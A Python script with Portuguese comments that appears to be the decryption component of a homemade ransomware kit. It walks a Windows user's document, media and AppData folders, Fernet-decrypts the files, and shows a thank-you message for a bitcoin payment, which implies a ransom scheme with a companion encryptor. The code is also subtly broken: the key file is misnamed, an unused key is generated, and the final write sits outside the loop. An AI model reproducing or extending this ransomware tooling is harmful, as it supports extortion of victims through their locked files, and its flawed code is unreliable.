import os
from cryptography.fernet import Fernet
import tkinter as tk

# a chave para criptografar e descriptografar
key = Fernet.generate_key()
with open("chave.eky", "rb") as chave:
    chave_secreta = chave.read()

# lista dos arquivos para descriptografar
username = os.getenv("USERNAME")
folders = [
    os.path.join(r"C:\Users", username, "Documents"),
    os.path.join(r"C:\Users", username, "Pictures"),
    os.path.join(r"C:\Users", username, "Videos"),
    os.path.join(r"C:\Users", username, "Downloads"),
    os.path.join(r"C:\Users", username, "AppData", "Local"),
    os.path.join(r"C:\Users", username, "AppData", "Roaming"),
    ]

arquivos = []

for folder in folders:
    for root, dirs, files in os.walk(folder):
        for file in files:

            if file in ["bebel.py", "chave.key", "Cryptonita.py", "desktop.ini"]:
                continue
                
            file_path = os.path.join(root,file)
            arquivos.append(file_path)

# descriptografar os arquivos
for arquivo in arquivos:
    with open(arquivo, "rb") as file:
        conteudo = file.read()
    
    conteudo_descriptografado = Fernet(chave_secreta).decrypt(conteudo)

with open(arquivo, "wb") as file:
    file.write(conteudo_descriptografado)

janela = tk.Tk()
janela.title("ATENÇÃO")
msg = tk.Label(janela, text="Seus arquivos estao sendo descriptografados.\nObrigado pelos BTC RS.")
msg.pack(padx=20, pady=20)
janela.mainloop()